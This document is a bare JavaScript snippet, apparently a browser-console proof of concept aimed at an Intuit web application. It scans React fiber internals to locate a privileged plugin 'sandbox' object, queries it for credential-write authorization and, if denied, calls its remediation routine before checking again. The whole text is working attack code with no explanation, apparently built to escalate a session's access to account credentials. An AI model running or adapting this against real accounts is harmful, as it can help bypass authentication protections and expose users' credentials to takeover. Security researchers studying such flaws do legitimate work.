(async()=>{
  const live=v=>!!(v&&typeof v.remediate==="function"&&v.authorization&&typeof v.authorization.isAuthorizedBatch==="function");
  const fromProps=p=>{
    if(!p)return null;
    if(live(p.sandbox))return p.sandbox;
    if(live(p.pluginSandbox))return p.pluginSandbox;
    for(const st of [p.store,p.value&&p.value.store]){
      try{
        const state=st&&typeof st.getState==="function"&&st.getState();
        if(state&&state.appState&&live(state.appState.sandbox))return state.appState.sandbox;
      }catch(_e){}
    }
    return null;
  };
  const fromFiber=f=>{
    const seen=new WeakSet();
    while(f&&typeof f==="object"&&!seen.has(f)){
      seen.add(f);
      for(const p of [f.memoizedProps,f.pendingProps,f.stateNode&&f.stateNode.props]){
        const sb=fromProps(p);
        if(sb)return sb;
      }
      f=f.return;
    }
    return null;
  };
  let sandbox=null;
  for(const el of document.querySelectorAll("*")){
    for(const key of Object.getOwnPropertyNames(el)){
      if(key.startsWith("__reactFiber$")||key.startsWith("__reactInternalInstance$")||key.startsWith("__reactContainer$")){
        sandbox=fromFiber(el[key]);
        if(sandbox)break;
      }
    }
    if(sandbox)break;
  }
  if(!sandbox){alert("Intuit sandbox not found");return;}
  const request={
    batchRequest:[{
      resource:{id:"irn.intuit.authentication.verifyAuthCredentialWriteAccess"},
      action:{id:"read"}
    }],
    apiVersion:"v2"
  };
  let decision=(await sandbox.authorization.isAuthorizedBatch(request))[0];
  if(!decision.isAuthorized){
    if(!decision.remediation||!decision.remediation.length){
      alert("Credential-write denied without remediation");
      return;
    }
    await sandbox.remediate({
      remediations:btoa(JSON.stringify({remediations:[{id:decision.remediation[0].id}]}))
    });
    decision=(await sandbox.authorization.isAuthorizedBatch(request))[0];
  }
  alert("Credential-write recentAuth="+!!decision.isAuthorized);
})()
